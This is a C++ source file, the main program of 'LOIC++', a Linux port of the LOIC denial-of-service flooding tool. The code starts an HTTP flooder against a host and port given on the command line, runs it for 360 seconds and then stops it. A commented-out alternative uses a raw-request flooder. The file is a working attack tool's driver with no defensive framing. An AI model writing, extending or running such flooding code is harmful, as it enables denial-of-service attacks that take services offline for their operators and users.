//============================================================================
// Name        : LOIC++.cpp
// Author      : Ivan Nelson Togboa Cadri
// Version     :
// Copyright   : 
// Description : Linux c++ version oif LOIC
//============================================================================

#include "HTTPFlooder.h"
#include "XXPFlooder.h"

using namespace loic;

int main(int argc,char *argv [])
{

	if(argc <4)
	{
		std::cout<<argc<<std::endl;
		exit(0);
	}
	loic::HTTPFlooder * flood = new loic::HTTPFlooder(argv[1],argv[2],"portal/site/934a7d79-e487-40b8-a262-b7367fa49f54",true,0,2,atoi(argv[3]));
	//loic::XXPFlooder * flood = new loic::XXPFlooder(argv[1],argv[2],1,0,false,"GET / HTTP/1.1\r\n\r\n");
	flood->Start();

	boost::this_thread::sleep(boost::posix_time::seconds(360));

	flood->Stop();
	return 0;
}
